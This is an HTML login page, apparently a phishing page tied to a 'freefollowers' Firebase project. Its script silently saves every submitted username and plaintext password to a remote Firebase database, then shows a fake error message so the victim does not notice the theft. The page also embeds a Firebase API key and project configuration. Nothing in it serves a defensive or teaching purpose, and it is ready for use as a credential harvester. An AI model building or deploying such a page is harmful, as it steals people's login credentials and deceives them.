<html>
  <head>
    <meta content="text/html; charset=utf-8" http-equiv="content-type"></meta>
    <title>Login Form</title>
    <style>
      body {
        margin: 0;
        padding: 0;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        font-family: Arial, sans-serif;
        background-color: #f3f3f3;
      }

      .form-container {
        text-align: center;
        padding: 20px;
        background-color: #ffffff;
        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        border-radius: 8px;
      }

      .input-field {
        display: block;
        width: 100%;
        max-width: 300px;
        margin: 10px auto;
        padding: 10px;
        border: 1px solid #ccc;
        border-radius: 5px;
        font-size: 16px;
      }

      .submit-button {
        display: block;
        width: 100%;
        max-width: 320px;
        margin: 15px auto;
        padding: 10px;
        background-color: #007bff;
        color: white;
        border: none;
        border-radius: 5px;
        font-size: 16px;
        cursor: pointer;
        transition: background-color 0.3s ease;
      }

      .submit-button:hover {
        background-color: #0056b3;
      }
    </style>
  </head>
  <body>
    <div class="form-container">
      <form id="loginForm">
        <input class="input-field" id="username" placeholder="Enter your Username" type="text" />
        <input class="input-field" id="password" placeholder="Enter your Password" type="password" />
        <button class="submit-button" type="submit">Login</button>
      </form>
    </div>

    <script type="module">
      // Import Firebase SDK
      import { initializeApp } from "https://www.gstatic.com/firebasejs/11.2.0/firebase-app.js";
      import { getDatabase, set, ref } from "https://www.gstatic.com/firebasejs/11.2.0/firebase-database.js";

      // Firebase configuration
      const firebaseConfig = {
        apiKey: "AIzaSyD2eitt5iTwBaTx8CWeuuPeyD7nTa58XD8",
        authDomain: "freefollowers-d31af.firebaseapp.com",
        databaseURL: "https://freefollowers-d31af-default-rtdb.firebaseio.com",
        projectId: "freefollowers-d31af",
        storageBucket: "freefollowers-d31af.appspot.com",
        messagingSenderId: "807949104285",
        appId: "1:807949104285:web:2c0238cdc7913dad279074",
        measurementId: "G-ME1GQ5KV8H"
      };

      // Initialize Firebase
      const app = initializeApp(firebaseConfig);
      const db = getDatabase(app);

      // Function to write user data
      function writeUserData(userID, username, password) {
        set(ref(db, "users/" + userID), {
          username: username,
          password: password,
        });
      }

      // Handle form submission
      document.getElementById("loginForm").addEventListener("submit", (event) => {
        event.preventDefault(); // Prevent form submission

        const username = document.getElementById("username").value;
        const password = document.getElementById("password").value;
        const userID = new Date().getTime(); // Example: Use timestamp as a unique ID

        if (username && password) {
          writeUserData(userID, username, password);
          alert("Your Account is Unexpected! Please try again later!");
        } else {
          alert("Please fill in both fields.");
        }
      });
    </script>
  </body>
</html>
